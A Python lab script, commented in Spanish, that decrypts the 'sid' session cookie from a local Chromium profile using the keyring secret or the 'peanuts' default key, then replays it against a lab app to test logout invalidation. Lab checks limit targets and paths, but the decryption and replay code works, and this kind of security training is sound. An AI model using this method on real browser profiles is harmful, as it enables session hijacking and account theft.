#!/usr/bin/env python3
"""Lee la cookie `sid` del perfil de Chromium, la descifra y la prueba contra el app.

Pensado para ejecutarse dentro de la VM del laboratorio, contra el app local de
`02-identity-security/lab/sesion-cookie`. No sirve para otro destino ni para
perfiles ajenos: el destino se limita a la red del laboratorio y el perfil a las
rutas de Chromium del propio equipo.

No imprime el valor de la cookie: solo el estado HTTP, un sha256 recortado y el
host consultado, que sirven de evidencia sin publicar el secreto.

Uso:
    python3 extraer_cookie.py --url http://10.0.2.2:8011
    python3 extraer_cookie.py --solo-llave        # qué clave hay disponible
    python3 extraer_cookie.py --sin-cookie        # el 302 de referencia
    python3 extraer_cookie.py --logout            # y el 302 tras cerrar sesión

Chromium en Linux cifra `encrypted_value` con AES-128-CBC y una clave de 16
bytes derivada (PBKDF2-HMAC-SHA1, 1 iteración, sal "saltysalt") de un secreto:
la contraseña del llavero del escritorio, o la literal "peanuts" cuando no hay
llavero disponible.
"""

from __future__ import annotations

import argparse
import hashlib
import os
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

SAL = b"saltysalt"
ITERACIONES = 1
LONGITUD = 16
IV = b" " * 16
PREFIJOS_PERFIL = (
    "~/.config/chromium",
    "~/snap/chromium",
    "~/.config/google-chrome",
)
RUTAS_PERFIL = (
    "~/.config/chromium/Default/Cookies",
    "~/.config/chromium/Profile 1/Cookies",
    "~/snap/chromium/common/chromium/Default/Cookies",
    "~/.config/google-chrome/Default/Cookies",
)
DESTINOS = ("10.0.2.2", "127.0.0.1", "localhost")
ESQUEMA_LLAVERO = "chrome_libsecret_os_crypt_password_v2"
APLICACIONES_LLAVERO = ("chromium", "chrome")


def clave_del_llavero() -> bytes | None:
    """Devuelve el secreto del llavero, si `secret-tool` y el llavero lo dan."""
    if not shutil.which("secret-tool"):
        return None
    for aplicacion in APLICACIONES_LLAVERO:
        orden = [
            "secret-tool", "lookup",
            "application", aplicacion,
            "xdg:schema", ESQUEMA_LLAVERO,
        ]
        try:
            salida = subprocess.run(orden, capture_output=True, text=True, timeout=10)
        except (OSError, subprocess.TimeoutExpired):
            continue
        if salida.returncode == 0 and salida.stdout.strip():
            return salida.stdout.strip().encode()
    return None


def derivar(secreto: bytes) -> bytes:
    return hashlib.pbkdf2_hmac("sha1", secreto, SAL, ITERACIONES, LONGITUD)


def descifrar(blob: bytes, clave: bytes, permitir_openssl: bool = False) -> bytes | None:
    """AES-128-CBC sin relleno de padding; devuelve None si no cuadra."""
    if len(blob) <= 3 or len(blob) % 16 != 0:
        return None
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    except ImportError:
        if permitir_openssl:
            return descifrar_openssl(blob, clave)
        return None
    descifrador = Cipher(algorithms.AES(clave), modes.CBC(IV)).decryptor()
    crudo = descifrador.update(blob) + descifrador.finalize()
    relleno = crudo[-1]
    if not 1 <= relleno <= 16 or crudo[-relleno:] != bytes([relleno]) * relleno:
        return None
    return crudo[:-relleno]


def descifrar_openssl(blob: bytes, clave: bytes) -> bytes | None:
    """Descifrado con `openssl`, solo para el secreto público "peanuts".

    La clave viaja en la línea de comandos y un proceso local puede leerla, así
    que este camino no se usa con el secreto del llavero.
    """
    if not shutil.which("openssl"):
        return None
    orden = [
        "openssl", "enc", "-d", "-aes-128-cbc", "-nopad",
        "-K", clave.hex(), "-iv", IV.hex(),
    ]
    try:
        salida = subprocess.run(orden, input=blob, capture_output=True, timeout=10)
    except (OSError, subprocess.TimeoutExpired):
        return None
    if salida.returncode != 0 or not salida.stdout:
        return None
    crudo = salida.stdout
    relleno = crudo[-1]
    if not 1 <= relleno <= 16 or crudo[-relleno:] != bytes([relleno]) * relleno:
        return None
    return crudo[:-relleno]


def quitar_prefijo_de_host(crudo: bytes, host: str) -> bytes:
    """Chromium moderno antepone sha256(host_key) al valor."""
    if len(crudo) > 32 and crudo[:32] == hashlib.sha256(host.encode()).digest():
        return crudo[32:]
    return crudo


def valor_de_cookie(cifrado: bytes, host: str, claves: list[tuple[str, bytes]]):
    """Prueba cada clave y devuelve (valor, nombre de la clave) o (None, motivo)."""
    if not cifrado:
        return None, "la cookie está vacía"
    if not cifrado.startswith((b"v10", b"v11")):
        return None, "formato de cifrado no soportado"
    motivo = "ninguna clave descifra el valor"
    for nombre, secreto in claves:
        crudo = descifrar(cifrado[3:], derivar(secreto), permitir_openssl=(nombre == "peanuts"))
        if crudo is None:
            continue
        valor = quitar_prefijo_de_host(crudo, host)
        try:
            return valor.decode("utf-8"), nombre
        except UnicodeDecodeError:
            motivo = f"descifra con {nombre}, pero el texto no es utf-8"
    return None, motivo


def buscar_cookies(db: Path, nombre: str) -> list[sqlite3.Row]:
    with tempfile.TemporaryDirectory() as carpeta:
        copia = Path(carpeta) / "Cookies"
        shutil.copy2(db, copia)
        os.chmod(copia, 0o600)
        conexion = sqlite3.connect(f"file:{copia}?mode=ro", uri=True)
        conexion.row_factory = sqlite3.Row
        try:
            return list(conexion.execute(
                "SELECT host_key, name, value, encrypted_value, expires_utc "
                "FROM cookies WHERE name = ?", (nombre,),
            ))
        finally:
            conexion.close()


def caducada(expires_utc: int) -> bool:
    """`expires_utc` va en microsegundos desde 1601; 0 es sesión."""
    return expires_utc > 0 and expires_utc / 1_000_000 - 11_644_473_600 < time.time()


def probar(url: str, nombre: str, valor: str | None, ruta: str) -> tuple[int, str]:
    peticion = urllib.request.Request(url.rstrip("/") + ruta)
    if valor is not None:
        peticion.add_header("Cookie", f"{nombre}={valor}")
    clase = type("SinRedireccion", (urllib.request.HTTPRedirectHandler,), {
        "redirect_request": lambda *a, **k: None,
    })
    abridor = urllib.request.build_opener(clase)
    try:
        with abridor.open(peticion, timeout=10) as respuesta:
            return respuesta.status, respuesta.geturl()
    except urllib.error.HTTPError as error:
        return error.code, error.headers.get("Location", "")
    except urllib.error.URLError as error:
        return 0, str(error.reason)


def cerrar_sesion(url: str, nombre: str, valor: str) -> None:
    peticion = urllib.request.Request(
        url.rstrip("/") + "/logout", data=b"", method="POST",
    )
    peticion.add_header("Cookie", f"{nombre}={valor}")
    try:
        urllib.request.urlopen(peticion, timeout=10).close()
    except (urllib.error.URLError, urllib.error.HTTPError):
        pass


def destino_del_laboratorio(url: str) -> bool:
    host = urllib.parse.urlsplit(url).hostname or ""
    return host in DESTINOS


def perfil_del_equipo(ruta: Path) -> bool:
    return any(ruta.is_relative_to(Path(p).expanduser()) for p in PREFIJOS_PERFIL)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default="http://10.0.2.2:8011",
                        help="base del app en el host (por defecto 10.0.2.2:8011)")
    parser.add_argument("--db", help="ruta al fichero Cookies del perfil")
    parser.add_argument("--nombre", default="sid", help="nombre de la cookie")
    parser.add_argument("--solo-llave", action="store_true",
                        help="solo informa de la clave disponible y sale")
    parser.add_argument("--sin-cookie", action="store_true",
                        help="consulta sin cookie, para tener el 302 de referencia")
    parser.add_argument("--logout", action="store_true",
                        help="tras probar la cookie, cierra sesión y vuelve a probar")
    args = parser.parse_args()

    if not destino_del_laboratorio(args.url):
        print(f"destino fuera del laboratorio: {args.url}", file=sys.stderr)
        print(f"solo se admite {', '.join(DESTINOS)}", file=sys.stderr)
        return 2

    llavero = clave_del_llavero()
    claves: list[tuple[str, bytes]] = []
    if llavero:
        claves.append(("llavero", llavero))
    claves.append(("peanuts", b"peanuts"))

    if args.solo_llave:
        print("llavero:", "sí" if llavero else "no")
        print("claves a probar:", ", ".join(nombre for nombre, _ in claves))
        return 0

    if args.sin_cookie:
        codigo, destino = probar(args.url, args.nombre, None, "/privado")
        print(f"/privado sin cookie: {codigo or 'error'} {destino}".rstrip())
        return 0

    if args.db:
        db = Path(os.path.expanduser(args.db))
    else:
        db = next(
            (p for p in map(lambda r: Path(os.path.expanduser(r)), RUTAS_PERFIL) if p.exists()),
            None,
        )
        if db is None:
            print("no encuentro el perfil de Chromium; pasa --db", file=sys.stderr)
            return 2

    if not perfil_del_equipo(db):
        print(f"perfil fuera de las rutas admitidas: {db}", file=sys.stderr)
        return 2

    print("perfil:", db)
    print("llavero:", "sí" if llavero else "no")
    try:
        filas = buscar_cookies(db, args.nombre)
    except (sqlite3.Error, OSError) as error:
        print("no se puede leer la base de cookies:", error, file=sys.stderr)
        return 2
    if not filas:
        print(f"sin cookies llamadas {args.nombre!r} en el perfil", file=sys.stderr)
        return 2

    descifradas = 0
    for fila in filas:
        host = fila["host_key"]
        print(f"\nhost {host}")
        print("cifrada:", "v10/v11" if fila["encrypted_value"][:3] in (b"v10", b"v11") else "no")
        if caducada(fila["expires_utc"]):
            print("caducada: sí — no se prueba")
            continue
        print("caducada: no")
        valor, como = valor_de_cookie(fila["encrypted_value"], host, claves)
        if valor is None:
            print("descifrado: falla —", como)
            continue
        descifradas += 1
        print("descifrado: sí —", como)
        print("sha256:", hashlib.sha256(valor.encode()).hexdigest()[:16])
        codigo, destino = probar(args.url, args.nombre, valor, "/privado")
        print(f"/privado: {codigo or 'error'} {destino}".rstrip())
        if args.logout:
            cerrar_sesion(args.url, args.nombre, valor)
            codigo, destino = probar(args.url, args.nombre, valor, "/privado")
            print(f"/privado tras logout: {codigo or 'error'} {destino}".rstrip())

    return 0 if descifradas else 3


if __name__ == "__main__":
    sys.exit(main())
